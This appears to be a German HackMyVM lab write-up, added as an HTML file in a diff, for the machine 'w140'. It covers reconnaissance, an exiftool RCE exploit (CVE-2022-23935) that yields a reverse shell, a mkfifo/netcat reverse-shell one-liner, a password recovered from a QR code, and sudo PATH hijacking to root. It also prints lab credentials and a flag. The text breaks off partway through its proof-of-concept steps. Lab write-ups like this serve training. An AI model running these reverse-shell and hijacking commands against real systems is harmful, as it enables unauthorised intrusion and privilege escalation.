@@ -1,0 +1,641 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>w140 - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>w140 - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">python3 (Exploit/HTTP Server)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">which</div>
+                <div class="tool-item">pty (Python module)</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">mkfifo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">QR Reader (Online/Offline)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (RCE via CVE-2022-23935)</a></li>
+                <li><a href="#privesc-ghost">Privilege Escalation (www-data -> ghost via QR Code)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (ghost -> root via PATH Hijacking)</a></li>
+                <li><a href="#poc">Proof of Concept (PATH Hijacking)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Prozess beginnt mit einem `arp-scan -l`, um aktive Hosts im lokalen Netzwerk zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Host `192.168.2.116` wird identifiziert. Die MAC-Adresse `08:00:27:ea:a7:de` gehört zu PCS Systemtechnik GmbH, was auf eine VirtualBox-VM hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Nmap-Scan auf `192.168.2.116` durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standard-Netzwerksicherheitsmaßnahmen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.114
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1       00:50:56:c0:00:08       VMware, Inc.
+192.168.2.116     08:00:27:ea:a7:de       PCS Systemtechnik GmbH
+192.168.2.254     00:50:56:f8:46:8c       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.861 seconds (137.56 hosts/sec). 3 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf `192.168.2.116` durchgeführt. Optionen: `-sS` (SYN Scan), `-sC` (Default Scripts), `-T5` (Insane Timing), `-A` (OS/Version/Script/Trace), `-p-` (Alle Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nmap findet zwei offene Ports:
+                *   **Port 22/tcp:** SSH (OpenSSH 8.4p1 Debian).
+                *   **Port 80/tcp:** HTTP (Apache httpd 2.4.54 Debian). Der Titel der Seite ist "w140".
+                Die OS-Erkennung deutet auf Linux hin und bestätigt VirtualBox.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Webserver auf Port 80 ist der primäre Angriffsvektor. Untersuchen Sie die Webseite `http://192.168.2.116/`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie SSH und Apache. Halten Sie Dienste aktuell (Apache ist hier aktuell).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.116 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 14:52 CEST
+Nmap scan report for w140 (192.168.2.116)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 fffdb20f38881a44c42b642cd297f68d (RSA)
+|   256 ca5054f7244ea7f10646e72230ec95b7 (ECDSA)
+|_  256 0968c062831ef15dcb29a65eb472aacf (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: w140
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:EA:A7:DE (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms w140 (192.168.2.116)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.94 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine HEAD-Anfrage mit `curl -Iv` wird an die IP gesendet, um die HTTP-Header zu überprüfen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt Apache/2.4.54, HTML-Inhalt und einen ETag. Keine neuen Erkenntnisse.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -Iv 192.168.2.116</span></div>
+                    <pre>
+*   Trying 192.168.2.116:80...
+* Connected to 192.168.2.116 (192.168.2.116) port 80 (#0)
+> HEAD / HTTP/1.1
+> Host: 192.168.2.116
+> User-Agent: curl/7.86.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Tue, 04 Apr 2023 12:53:23 GMT
+< Server: Apache/2.4.54 (Debian)
+< Last-Modified: Mon, 06 Feb 2023 17:43:02 GMT
+< ETag: "33b3-5f40b900ad580"
+< Accept-Ranges: bytes
+< Content-Length: 13235
+< Vary: Accept-Encoding
+< Content-Type: text/html
+<
+* Connection #0 to host 192.168.2.116 left intact
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf bekannte Schwachstellen und interessante Dateien/Verzeichnisse zu scannen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto bestätigt Apache/2.4.54. Es meldet fehlende Security Header und das mögliche ETag-Inode-Leak. Es findet Verzeichnisse mit Directory Indexing (`/css/`, `/manual/images/`) und das Apache-Handbuch (`/manual/`). Keine kritischen Funde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie Directory/File Busting durch, um anwendungsspezifische Inhalte zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie fehlende Security Header. Deaktivieren Sie Directory Indexing und entfernen Sie das Apache-Handbuch.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.116</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        80
++ Start Time:         2023-04-04 14:53:45 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 33b3, size: 5f40b900ad580, mtime: gzip
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ 7915 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2023-04-04 14:55:21 (GMT2) (96 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche verwendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Neben Standardverzeichnissen (`/assets`, `/css`, `/js`, `/manual`) wird die Datei `/upload.php` gefunden. Dies ist, wie im vorherigen Beispiel, ein **sehr wichtiger Fund**, da er auf eine Upload-Funktionalität hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie `/upload.php`. Testen Sie, welche Dateitypen erlaubt sind, wo Dateien gespeichert werden und ob sie ausgeführt werden können. Prüfen Sie auf bekannte Schwachstellen in Upload-Skripten oder den dahinterliegenden Bibliotheken (z.B. ImageMagick, ExifTool).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie die Upload-Funktion rigoros ab (Dateitypprüfung serverseitig, Umbenennung, Speicherung außerhalb des Web-Roots, Malware-Scan).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.116 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+# ... (options) ...
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.116/index.html           (Status: 200) [Size: 13235]
+http://192.168.2.116/assets               (Status: 301) [Size: 315] [--> http://192.168.2.116/assets/]
+http://192.168.2.116/upload.php           (Status: 200) [Size: 3773] # Wichtig!
+http://192.168.2.116/service.html         (Status: 200) [Size: 3417]
+http://192.168.2.116/css                  (Status: 301) [Size: 312] [--> http://192.168.2.116/css/]
+http://192.168.2.116/manual               (Status: 301) [Size: 315] [--> http://192.168.2.116/manual/]
+http://192.168.2.116/js                   (Status: 301) [Size: 311] [--> http://192.168.2.116/js/]
+===============================================================
+Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Seite `/upload.php` wird aufgerufen. Sie präsentiert sich als "Image Forensics"-Tool und meldet nach einem (impliziten) Upload-Versuch "Error: Invalid File Type!".
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Bestätigt die Funktion als Bild-Upload und eine serverseitige Prüfung des Dateityps. Der Name "eForenzics" und die Funktion (Bildforensik) legen nahe, dass Backend-Tools wie `exiftool` oder ähnliche Bibliotheken verwendet werden könnten, die möglicherweise Schwachstellen aufweisen.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Recherchieren Sie nach bekannten RCE-Schwachstellen in Bildverarbeitungsbibliotheken, insbesondere `exiftool`. Versuchen Sie, eine speziell präparierte Bilddatei hochzuladen, um eine solche Schwachstelle (z.B. CVE-2022-23935) auszunutzen.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Analyse von http://192.168.2.116/upload.php
+
+# Webseiten-Inhalt (vereinfacht):
+eForenzics
+ Home | About | Pricing | Reviews
+ Image Forensics
+ Upload an image file and we will provide a detailed forensic analysis
+ [Upload Button]
+ Error: Invalid File Type! # (Nach fehlgeschlagenem Upload)
+ Copyright 2023 © eForenzics
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (RCE via CVE-2022-23935)</h2>
+            <p class="analysis">
+                 <strong>Analyse:</strong> Nach fehlgeschlagenen SSH-Login-Versuchen und Abrufen der Host-Keys (die keine neuen Erkenntnisse brachten), wird ein Python-Exploit-Skript (`CVE-2022-23935.py`) verwendet. Dieses Skript zielt auf eine bekannte RCE-Schwachstelle ab, die oft in Verbindung mit `exiftool` oder ähnlichen Bibliotheken steht, die über Web-Uploads getriggert werden können. Das Skript erhält die Angreifer-IP (`192.168.2.114` - *Inkonsistenz zur Ziel-IP 116 und Angreifer-IP 114 im Text*) und einen Port (`9001`) als Argumente.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Das Exploit-Skript ist erfolgreich! Es meldet "[+] Connected!!!!" und "[+] Waiting for connections ... Got connection ...". Der Pentester erhält eine Reverse Shell als Benutzer `www-data`. Der Pfad der Shell (`/var/www/uploads/[timestamp]`) deutet darauf hin, dass der Exploit tatsächlich über die Upload-Funktion lief.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Reverse Shell. Führen Sie lokale Enumeration als `www-data` durch.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Patchen Sie die zugrundeliegende Schwachstelle (CVE-2022-23935), wahrscheinlich durch Update der Bildverarbeitungsbibliothek (z.B. ExifTool). Überprüfen Sie die Upload-Funktion generell auf Sicherheit.
+             </p>
+             <!-- SSH Versuche (redundant/fehlgeschlagen) -->
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh w140@w140.net -p 22</span></div>
+                      <pre>
+The authenticity of host 'w140.net (192.168.2.116)' can't be established.
+# ...
+w140@w140.net's password:
+Permission denied, please try again.
+# ...
+w140@w140.net: Permission denied (publickey,password).
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh-keyscan 192.168.2.116</span></div>
+                      <pre># ... (Host Key Ausgabe) ...</pre>
+                  </div>
+              </div>
+              <!-- Exploit Ausführung -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">python3 CVE-2022-23935.py 192.168.2.114 9001</span></div>
+                      <!-- Annahme: Exploit lädt präparierte Datei hoch -->
+                      <pre>
+[+] Connected!!!!
+
+   _____ __      __ ______      ___    ___  ___   ___        ___   ____    ___  ____   _____
+  / ____|\ \    / /|  ____|    |__ \  / _ \|__ \ |__ \      |__ \ |___ \  / _ \|___ \ | ____|
+ | |      \ \  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || (_) | __) || |__
+ | |       \ \/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ <  \__, ||__ < |___ \
+ | |____    \  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) |   / / ___) | ___) |
+  \_____|    \/    |______|    |____| \___/|____||____|     |____||____/   /_/ |____/ |____/
+
+                                            by 0xFTW
+
+[+] Trying to bind to :: on port 9001: Done
+[+] Waiting for connections on :::9001: Got connection from ::ffff:192.168.2.116 on port 54378
+[*] Switching to interactive mode
+bash: cannot set terminal process group (505): Inappropriate ioctl for device
+bash: no job control in this shell
+                      </pre>
+                      <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680616771$ $</div> <!-- Prompt zeigt www-data -->
+                  </div>
+              </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die erhaltene Reverse Shell wird mit den Standardmethoden stabilisiert (`python3 -c 'import pty...'`, `export TERM=xterm`, `reset`, `stty raw -echo; fg`). Ein Versuch, eine zweite Reverse Shell mit `mkfifo` zu starten, wird ebenfalls gezeigt.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die erste Shell wird erfolgreich stabilisiert. Der zweite Reverse-Shell-Versuch ist redundant, funktioniert aber ebenfalls.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Stabilisierung der ersten Shell -->
+                     <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680616771$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680616771$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680616771$ <span class="command">reset</span></div>
+                     <!-- Auf Angreifer-System: Ctrl+Z, stty raw -echo; fg -->
+                     <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680617173$ </div> <!-- Stabilisierte Shell -->
+
+                     <!-- Zweite (redundante) Reverse Shell -->
+                     <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680617173$ <span class="command">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.114 9002 >/tmp/f</span></div>
+                     <!-- Auf Angreifer-System (anderes Terminal) -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                     <pre>
+listening on [any] 9002 ...
+connect to [192.168.2.114] from (UNKNOWN) [192.168.2.116] 50886
+/bin/sh: 0: can't access tty; job control turned off
+$
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-ghost">
+             <h2>Privilege Escalation (www-data -> ghost via QR Code)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Als `www-data` werden SUID-Dateien und die Kernel-Version enumeriert. Anschließend wird nach einer verdächtigen Datei `.w140.png` gesucht, diese gefunden, per Python HTTP-Server bereitgestellt und auf die Angreifer-Maschine heruntergeladen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die SUID- und Kernel-Enumeration liefert keine direkten Hinweise. Der entscheidende Fund ist die versteckte PNG-Datei `/var/www/.w140.png`. Das Bereitstellen über einen Python HTTP-Server ist eine gängige Methode, um Dateien vom Ziel zum Angreifer zu übertragen.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Analysieren Sie die heruntergeladene PNG-Datei `.w140.png` (lokal umbenannt in `benni.png`) auf versteckte Informationen (Metadaten, Steganographie, visuelle Hinweise wie QR-Codes).
+             </p>
+             <!-- Lokale Enumeration -->
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt no-kali-prompt">www-data@w140:/var$ <span class="command">find / -type f -perm -4000 2>/dev/null</span></div>
+                      <pre>
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+                      </pre>
+                      <div class="prompt no-kali-prompt">www-data@w140:/var$ <span class="command">uname -a</span></div>
+                      <pre>Linux w140 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux</pre>
+                  </div>
+              </div>
+              <!-- PNG Fund und Download -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680615942$ <span class="command">find / -name .w140.png 2>/dev/null</span></div>
+                      <pre>/var/www/.w140.png</pre>
+                      <div class="prompt no-kali-prompt">www-data@w140:/var/www/uploads/1680615942$ <span class="command">cd /var/www</span></div>
+                      <div class="prompt no-kali-prompt">www-data@w140:/var/www$ <span class="command">python3 -m http.server 8005</span></div>
+                      <pre>Serving HTTP on 0.0.0.0 port 8005 (http://0.0.0.0:8005/) ...</pre>
+                      <!-- Auf Angreifer-System -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.116:8005/.w140.png</span></div>
+                      <pre># ... (wget download output) ...</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv .w140.png benni.png</span></div>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die heruntergeladene PNG-Datei wird mit einem Online QR-Code-Reader (qreader.online) analysiert. Das Ergebnis ist der String `BaoeCblP5KGJDmA`. Anschließend wird versucht, mit `su ghost` und diesem String als Passwort den Benutzer zu wechseln.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Analyse des QR-Codes liefert das Passwort für den Benutzer `ghost`. Der `su`-Befehl ist erfolgreich, und der Angreifer erlangt eine Shell als `ghost`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Rechte des Benutzers `ghost` (insbesondere `sudo -l`). Suchen Sie die User-Flag.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Speichern Sie keine Passwörter in QR-Codes in versteckten Dateien. Verwenden Sie starke Passwörter.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Analyse der Datei benni.png (lokal) mit https://qreader.online/
+# Ergebnis des QR-Codes:
+<span class="password">BaoeCblP5KGJDmA</span>
+                     </pre>
+                      <!-- Auf Zielsystem (als www-data) -->
+                      <div class="prompt no-kali-prompt">www-data@w140:/var/www$ <span class="command">su ghost</span></div>
+                      <pre>Password: <span class="password">BaoeCblP5KGJDmA</span></pre>
+                      <div class="prompt no-kali-prompt">ghost@w140:/var/www$ </div> <!-- Erfolgreicher Wechsel -->
+                  </div>
+              </div>
+        </section>
+
+        <section id="privesc-root">
+             <h2>Privilege Escalation (ghost -> root via PATH Hijacking)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Als Benutzer `ghost` werden die `sudo`-Rechte geprüft. Anschließend wird eine SSH-Verbindung als `ghost` aufgebaut (bestätigt das Passwort), das Home-Verzeichnis untersucht und die User-Flag gelesen. Schließlich wird das Skript `/opt/Benz-w140`, das per `sudo` ausgeführt werden darf, analysiert.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   `sudo -l`: Enthüllt die kritische Regel: `(root) SETENV: NOPASSWD: /opt/Benz-w140`. `ghost` kann das Skript als `root` ohne Passwort ausführen und Umgebungsvariablen setzen (`SETENV`).
+                 *   SSH-Login & User-Flag: Bestätigt den Zugang als `ghost` und liefert die User-Flag `<span class="password">61f1157a5b8f5a4b6729367098fcb2a4</span>`.
+                 *   `cat /opt/Benz-w140`: Zeigt, dass das Skript relative Pfade für Befehle wie `cat`, `truncate` und **`find`** verwendet.
+                 Die Kombination aus `SETENV`, `NOPASSWD` und der Verwendung von relativen Pfaden im `sudo`-Skript ermöglicht PATH-Hijacking.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Führen Sie PATH-Hijacking durch:
+                 1.  Erstellen Sie in `/tmp` eine ausführbare Datei namens `find`, die `/bin/bash` enthält.
+                 2.  Führen Sie das `sudo`-Kommando aus, aber setzen Sie die `PATH`-Variable so, dass `/tmp` zuerst durchsucht wird: `sudo PATH=/tmp:$PATH /opt/Benz-w140`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Korrigieren Sie die `sudo`-Regel. Entfernen Sie `SETENV` und `NOPASSWD`, wenn nicht absolut zwingend notwendig und sicher implementiert. Korrigieren Sie das Skript `/opt/Benz-w140`, indem Sie absolute Pfade für alle Befehle verwenden (z.B. `/usr/bin/find` statt `find`).
+             </p>
+            <!-- sudo -l als ghost -->
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt no-kali-prompt">ghost@w140:/var/www$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for ghost on w140:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ghost may run the following commands on w140:
+    (root) SETENV: NOPASSWD: /opt/Benz-w140
+                     </pre>
+                 </div>
+             </div>
+             <!-- SSH Login und User Flag -->
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt no-kali-prompt">ghost@w140:/var/www$ <span class="command">ssh ghost@192.168.2.116</span></div>
+                      <pre>
+The authenticity of host '192.168.2.116 (192.168.2.116)' can't be established.
+# ... (Key Fingerprint) ...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.116' (ECDSA) to the list of known hosts.
+Password: <span class="password">BaoeCblP5KGJDmA</span>
+Last login: Tue Feb 21 13:18:19 2023 from 192.168.56.46
+                      </pre>
+                       <div class="prompt no-kali-prompt">ghost@w140:~$ <span class="command">ls -la</span></div>
+                       <pre>
+total 32
+drwxr-xr-x 4 ghost ghost 4096 Apr  4 10:37 .
+drwxr-xr-x 3 root  root  4096 Jan 29 14:51 ..
+lrwxrwxrwx 1 root  root     9 Feb  8 14:18 .bash_history -> /dev/null
+-rw-r--r-- 1 ghost ghost  220 Jan 29 14:51 .bash_logout
+-rw-r--r-- 1 ghost ghost 3526 Jan 29 14:51 .bashrc
+drwxr-xr-x 3 ghost ghost 4096 Feb 14 14:14 .local
+-rw-r--r-- 1 ghost ghost  807 Jan 29 14:51 .profile
+drwx------ 2 ghost ghost 4096 Apr  4 10:37 .ssh
+-rw------- 1 ghost ghost   33 Feb 21 13:01 user.txt
+                       </pre>
+                       <div class="prompt no-kali-prompt">ghost@w140:~$ <span class="command">cat user.txt</span></div>
+                       <pre><span class="password">61f1157a5b8f5a4b6729367098fcb2a4</span></pre>
+                   </div>
+               </div>
+               <!-- Analyse des Sudo-Skripts -->
+               <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt no-kali-prompt">ghost@w140:~$ <span class="command">file /opt/Benz-w140</span></div>
+                        <pre>/opt/Benz-w140: ASCII text</pre>
+                        <div class="prompt no-kali-prompt">ghost@w140:~$ <span class="command">cat /opt/Benz-w140</span></div>
+                        <pre>
+#!/bin/bash
+. /opt/.bashre
+cd /home/ghost/w140
+
+# clean up log files
+if [ -s log/w140.log ] && ! [ -L log/w140.log ]
+then
+/bin/cat log/w140.log > log/w140.log.old
+/usr/bin/truncate -s@ log/w140.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \; # Relative path for 'find'!
+                        </pre>
+                    </div>
+                </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+             <h2>Proof of Concept (PATH Hijacking)</h2>
+             <p class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept nutzt die unsichere `sudo`-Regel für `/opt/Benz-w140` aus, die `SETENV` erlaubt und ein Skript mit relativen Pfaden (insbesondere `find`) aufruft. Durch Manipulation der `PATH`-Umgebungsvariable wird `sudo` dazu gebracht, ein bösartiges `find`-Skript des Angreifers anstelle des System-`find` auszuführen, was zur Ausführung von Code als `root` führt.
+             </p>
+             <p class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 *   Zugriff als Benutzer `ghost`.
+                 *   Die `sudo`-Regel `(root) SETENV: NOPASSWD: /opt/Benz-w140` muss aktiv sein.
+                 *   Das Skript `/opt/Benz-w140` muss einen Befehl (hier `find`) mit relativem Pfad aufrufen.
+                 *   Schreibrechte in einem Verzeichnis, das im `PATH` vor `/usr/bin` platziert werden kann (z.B. `/tmp`).
+             </p>
+
+             <p class="analysis">
+                 <strong>Schritte zur Ausnutzung:</strong>
+                 1.  **Bösartiges Skript erstellen:** In einem beschreibbaren Verzeichnis (`/tmp`) wird eine Datei namens `find` erstellt, die lediglich `/bin/bash` enthält. Diese Datei wird ausführbar gemacht (`chmod +x find`).
